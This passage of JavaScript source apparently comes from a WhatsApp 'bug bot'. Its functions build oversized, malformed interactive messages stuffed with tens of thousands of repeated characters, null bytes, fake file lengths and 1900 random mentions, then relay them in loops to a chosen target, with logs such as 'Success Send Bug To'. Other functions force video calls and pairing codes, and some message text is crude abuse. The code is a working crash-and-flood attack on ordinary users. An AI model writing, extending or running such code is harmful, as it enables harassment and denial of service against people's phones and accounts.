                            text: `YxG - Lah Ajg wtf"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({ 
                            hasMediaAttachment: false 
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                            cards: cards 
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            messageParamsJson: "{[".repeat(10000),
                            messageVersion: 3,
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },           
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦽ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                },     
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦾ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        }, 
        { userJid: target }
    );
    
for (const msg of [loh, hayo, Hard, jekbut, iyakah]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  
}

async function XyrusDeath(sock, target) {
for (let i = 0; i < 20; i++) {
   await PaketExecute(sock, target);
   await InvisibleStc(sock, target);
await new Promise((r) => setTimeout (r,
1500));
  }
}

async function PaketExecute(sock, target) {
  try {
    const Trushed = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "🩸" + "𑇂𑆵𑆴𑆿".repeat(10000) }
          },
            extendedTextMessage: {
              text: "⚡ Paket Anda Sedang Di kemas Untuk Seterusnya" +
                "ꦽ".repeat(13000) +
                "ꦾ".repeat(13000)
          },
          contextInfo: {
            stanzaId: target,
            participant: target,
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "./Gama.js",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "nothing?" + "ꦾ".repeat(13000) + "@1".repeat(13000)
              },
              conversation:
                "DONE BLANK BY 𝗠𝗢𝗢𝗡" +
                "ꦽ".repeat(13000) +
                "ꦾ".repeat(13000)
            }
          },
          body: {
            text:
              "Halo Dweckk" +
              "ꦽ".repeat(13000) +
              "ꦾ".repeat(13000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ោ៝".repeat(13000)
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "ោ៝".repeat(13000)
              },
              {
                name: "cta_url",
                buttonParamsJson: "ោ៝".repeat(13000)
              },
              {
                name: "cta_call",
                buttonParamsJson: "ោ៝".repeat(13000)
              },
              {
                name: "cta_copy",
                buttonParamsJson: "ោ៝".repeat(13000)
              },
              {
                name: "cta_reminder",
                buttonParamsJson: "ោ៝".repeat(13000)
              },
              {
                name: "cta_cancel_reminder",
                buttonParamsJson: "ោ៝".repeat(13000)
              },
              {
                name: "address_message",
                buttonParamsJson: "ោ៝".repeat(13000)
              },
              {
                name: "send_location",
                buttonParamsJson: "ោ៝".repeat(13000)
              },
              {
                name: "quick_reply",
                buttonParamsJson: "ោ៝".repeat(13000)
              },
              {
                name: "mpm",
                buttonParamsJson: "ោ៝".repeat(13000)
              }
            ],
            flowActionPayload: {
              screen: "splash_screen",
              data: { mobile: true }
            }
          },
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }
    };

    const msg = generateWAMessageFromContent(target, Trushed, {});

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });
  } catch (err) {
    console.error("Error PaketExecute:", err);
  }
}

async function FourSixCorex(sock, target) {
  for (let i = 0; i < 10; i++) {
    await InvisibleStc(sock, target);
    await KyziiXZunn(target, sock);
    await CarouselOtax(otax, target);
    await NayenDelay(target, mention = true);
    await new Promise((r) => setTimeout(r, 1500));
  }
}

async function KanjutHytam(sock, target) {
console.log(chalk.blue(`Success Send Bug To ${target}`));
  const Flood = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "\u0000" + "ꦾ࣯࣯ោ៝".repeat(10000),
      caption: "\u0000" + "\u200D".repeat(70000),
      jpegThumbnail: null
    }
  };
  await sock.relayMessage(target, Flood, {
  participant: { jid: target }, 
  messageId: null
  });
  
  for (let r = 0; r < 50; r++) {
  try {
    const media = await prepareWAMessageMedia(
      { image: { url: "https://files.catbox.moe/xg1vaf.png" } },
      { upload: sock.waUploadToServer }
    );

    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              remoteJid: "X",
              stanzaId: "123",
              
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000, 
                },
              },
            },
            carouselMessage: {
              messageVersion: 1,
              cards: [
                {
                  header: {
                    hasMediaAttachment: true,
                    media: media.imageMessage,
                  },
                  body: {
                    text:
                      "𝐈𝐓'𝐒 𝐌𝐄 𝐊𝐈𝐍𝐆 𝐍𝐀𝐑𝐄𝐍𝐃𝐑𝐀\n\n" + "ꦽ".repeat(50000),
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Open",
                          url: "https://wa.me/0",
                        }),
                      },
                    ],
                    messageParamsJson: "{}",
                  },
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, msg, { messageId: null });
    console.log(chalk.blue(`Success Send Force To ${target}`));
  } catch (err) {
    console.error("Error❌ :", err);
  };
};
}

async function RamzGntng(sock, target) {
for (let i = 0; i < 50; i++) {
    await PaketExecute(sock, target);
    await KanjutHytam(sock, target);
await new Promise((r) => setTimeout (r,
1500));
  }
}

async function MahizaXtristan(target) {
  const ButtonsPush = [
    {
      name: "single_select",
      buttonParamsJson: JSON.stringify({  
        title: "ោ៝".repeat(2000),
        sections: [
          {
            title: "\u0000",
            rows: [],
          },
        ],
      }),
    },
  ];
  
  for (let i = 0; i < 10; i++) {
    ButtonsPush.push(
      {
        name: "galaxy_message",
        buttonParamsJson: "\u0000".repeat(1045000),
      },
    );
  }
  
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "𝗦𝗞𝗬𝗙𝗟𝗢𝗪",
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
              fileLength: "9999999999999",
              height: 9999,
              width: 9999,
              mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
              fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
              directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1755254367",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
            },
          },
          body: {
            text: "ꦽ".repeat(25000) + "ោ៝".repeat(20000),
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: ButtonsPush,
          },
          contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            ephemeralSettingTimestamp: 9741,
            entryPointConversionSource: "WhatsApp.com",
            entryPointConversionApp: "WhatsApp",
            disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
            },
            urlTrackingMap: {
              urlTrackingMapElements: [
                {
                  originalUrl: "https://t.me/vibracoess",
                  unconsentedUsersUrl: "https://t.me/vibracoess",
                  consentedUsersUrl: "https://t.me/vibracoess",
                  cardIndex: 1,
                },
                {
                  originalUrl: "https://t.me/vibracoess",
                  unconsentedUsersUrl: "https://t.me/vibracoess",
                  consentedUsersUrl: "https://t.me/vibracoess",
                  cardIndex: 2,
                },
              ],
            },
          },
        },
      },
    },
  }, { participant: { jid: target } });
}

async function NayenImup(sock, target) {
  await sock.offerCall(target, { video: true });
}

async function SendPairing(sock, jid) {
  try {

    const jid = phone.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

    const res = await sock.requestPairingCode(jid)

  await sock.relayMessage(target, res, {
    participant: { jid: target }
  });

  } catch (e) {
    console.error("SendPairing error:", e)
  }
}

async function Flowless(target) {
  try {
    const content = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            header: { title: "Ah Ngocrot mas" + "ꦽ".repeat(10000)+".com" },
            body: { text: "Kontol bapak lo pecah anjing" },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u200B".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u200B".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                }
              ]
            }
          }
        }
      }
    };

    const msg = await generateWAMessageFromContent(target, content, {
      userJid: sock?.user?.id
    });

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (error) {
  }
}


/// ~ End Function Bugs